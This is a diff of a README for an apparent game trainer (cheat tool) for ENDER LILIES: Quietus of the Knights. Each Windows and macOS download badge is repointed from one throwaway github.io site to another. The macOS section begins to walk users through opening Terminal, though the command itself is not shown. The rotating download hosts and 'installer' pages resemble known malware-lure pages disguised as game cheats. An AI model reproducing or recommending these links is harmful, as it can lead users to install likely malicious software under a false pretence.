@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download ENDER LILIES Quietus of the Knights Trainer](https://img.shields.io/badge/⬇_Download_ENDER%20LILIES%20Quietus%20of%20the%20Knights_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download ENDER LILIES Quietus of the Knights Trainer](https://img.shields.io/badge/⬇_Download_ENDER%20LILIES%20Quietus%20of%20the%20Knights_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -78,9 +78,9 @@ ENDER LILIES: Quietus of the Knights is a dark fantasy action RPG where you comm
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -101,7 +101,7 @@ ENDER LILIES: Quietus of the Knights is a dark fantasy action RPG where you comm
 
 <div align="center">
 
-[![⬇ Download ENDER LILIES Quietus of the Knights Trainer](https://img.shields.io/badge/⬇_Download_ENDER%20LILIES%20Quietus%20of%20the%20Knights_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download ENDER LILIES Quietus of the Knights Trainer](https://img.shields.io/badge/⬇_Download_ENDER%20LILIES%20Quietus%20of%20the%20Knights_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -133,7 +133,7 @@ ENDER LILIES: Quietus of the Knights is a dark fantasy action RPG where you comm
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -158,7 +158,7 @@ ENDER LILIES: Quietus of the Knights is a dark fantasy action RPG where you comm
 
 <div align="center">
 
-[![⬇ Download ENDER LILIES Quietus of the Knights Trainer](https://img.shields.io/badge/⬇_Download_ENDER%20LILIES%20Quietus%20of%20the%20Knights_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download ENDER LILIES Quietus of the Knights Trainer](https://img.shields.io/badge/⬇_Download_ENDER%20LILIES%20Quietus%20of%20the%20Knights_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
